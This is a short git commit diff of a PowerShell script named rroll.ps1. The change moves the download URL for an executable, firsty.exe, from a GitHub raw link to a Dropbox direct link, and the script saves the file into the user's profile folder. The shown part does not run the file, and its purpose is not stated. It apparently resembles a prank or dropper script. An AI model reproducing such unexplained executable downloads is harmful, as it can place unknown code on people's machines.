12738612fd342ba49dcb2d27d064134a946075ed
Cancarutu2012 <materadetzky2012@gmail.com>
2026-04-17 19:18:51 +0200

    Update rroll.ps1

--- rroll.ps1
+++ rroll.ps1
@@ -4,7 +4,7 @@
 cd $env:USERPROFILE
 
 
-Invoke-WebRequest -Uri "https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/firsty.exe" -OutFile "$env:USERPROFILE\firsty.exe"
+Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/q72l73er1ehnngz7i7lts/firsty.exe?rlkey=fbihnzvhsdd3zgc9szy2s2ck2&st=7254phb4&dl=1" -OutFile "$env:USERPROFILE\firsty.exe"
 cd $env:USERPROFILE
 
 
